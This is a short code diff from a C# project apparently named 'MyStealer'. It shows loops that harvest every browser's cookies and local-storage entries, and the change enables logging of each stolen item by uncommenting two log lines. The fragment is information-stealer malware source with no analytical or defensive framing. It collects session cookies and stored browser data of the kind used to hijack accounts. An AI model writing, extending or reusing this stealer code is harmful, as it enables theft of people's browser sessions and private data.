@@ -77,7 +77,7 @@ namespace MyStealer
                                     foreach (var cookie in browser.GetCookies())
                                     {
                                         cookies.Add(cookie);
-                                        //Log.Information(cookie.ToString());
+                                        Log.Information(cookie.ToString());
                                     }
                                 }
                                 catch (Exception ex)
@@ -90,7 +90,7 @@ namespace MyStealer
                                     foreach (var storageEntry in browser.GetLocalStorageEntries())
                                     {
                                         localStorage.Add(storageEntry);
-                                        //Log.Information(storageEntry.ToString());
+                                        Log.Information(storageEntry.ToString());
                                     }
                                 }
                                 catch (Exception ex)
